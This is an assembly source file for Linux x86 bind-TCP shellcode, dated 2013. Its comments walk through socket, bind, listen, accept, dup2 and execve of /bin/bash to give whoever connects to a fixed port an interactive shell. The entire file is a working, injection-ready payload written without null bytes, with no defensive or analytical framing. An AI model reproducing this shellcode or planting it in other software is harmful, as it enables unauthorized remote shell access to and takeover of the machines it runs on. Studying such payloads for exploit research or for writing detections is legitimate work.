; Filename  : bind_tcp_shell.asm
; Author    : M.Acosta <amcx62[_at_]gmail[_dot_]com>
; Date      : 2013 August
; Location  : Lima(Peru)
; Desc      : Bind Tcp Shellcode
; Tested on : Linux/x86 (Ubuntu SMP 3.2.0-49-generic-pae)

global _start

section .text

_start:
  
	; See:
	; linux/net.h 
	; bits/socket.h
	; netinet/in.h 

	;-------------------------------------------------------	
	; 1) SOCKET SYSCALL 
	;-------------------------------------------------------
	
	; socket(int domain, int type, int protocol);
	; socketcall(int call, unsigned long *args)
	
	; EBX arg1 = call 
	xor ebx, ebx
	mov bl, 1

	; ECX args( domain, type, protocol);
	push BYTE 6		
	push BYTE 1		
	push BYTE 2		
	xor ecx, ecx
	mov ecx, esp		

	; EAX = socketcall syscall
	xor eax, eax
	mov al, 102
	int 0x80

	; save socket file descriptor
	mov esi, eax		

	;-------------------------------------------------------	
	; 2) BIND SYSCALL
	;-------------------------------------------------------

	; bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	; socketcall(int call, unsigned long *args)
	
	
	; EBX arg1= call
	xor ebx, ebx
	mov bl, 2

	; ECX args={sockfd, {sin_addr,sin_port,sin_family}, socklen_t addrlen}
	xor ecx, ecx
	push ecx		

	push WORD 0x6020 ;port
	push WORD 2	
	mov ecx, esp		

	push BYTE 16		
	push ecx		
	push esi		
	mov ecx, esp		
	
	; EAX socketcall syscall
	xor eax, eax
	mov al, 102
	int 0x80


	;-------------------------------------------------------	
	; 3) LISTEN SYSCALL 
	;-------------------------------------------------------
	
	; listen(int sockfd, int backlog);
	; socketcall(int call, unsigned long *args)
	
	
	; EBX arg1= call
	xor ebx, ebx
	mov bl, 4		

	; ECX args={sockfd, backlog}
	push BYTE 1		
	push esi		
	mov ecx, esp	
	
	; EAX socketcall syscall
	xor eax, eax
	mov al, 102	
	int 0x80


	;-------------------------------------------------------	
	; 4) ACCEPT SYSCALL 
	;-------------------------------------------------------


	; accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	; socketcall(int call, unsigned long *args)

	; EBX arg1= call
	xor ebx, ebx
	mov bl, 5		

	; ECX args{sockfd, {sin_addr,sin_port,sin_family}, *addrlen}
	xor ecx, ecx
	push ecx		
	push ecx		
	push esi		
	mov ecx, esp		

	; EAX  socketcall syscall
	xor eax, eax
	mov al, 102	
	int 0x80

	;-------------------------------------------------------	
	; 5) DUP2 SYSCALL 
	;-------------------------------------------------------

	; int dup2(int oldfd, int newfd);
	
	; EBX arg1=oldf
	xchg eax, ebx

	;ECX arg2=newdfd
	
	xor ecx, ecx
	mov cl, 2 

dup2_loop:

	; EAX dup2 syscall
    	mov al, 0x3f 
   	int 0x80
    
    	dec cl
    	jns dup2_loop

	;-------------------------------------------------------	
	; 6) SPAWN SHELL
	;-------------------------------------------------------
	
	xor eax,eax
	push eax
	push 0x68736162 ;/bin/bash
	push 0x2f6e6962
	push 0x2f2f2f2f	
	mov ebx,esp

	push eax
	mov edx,esp

	push ebx
	mov ecx,esp

	mov al,11
	int 0x80
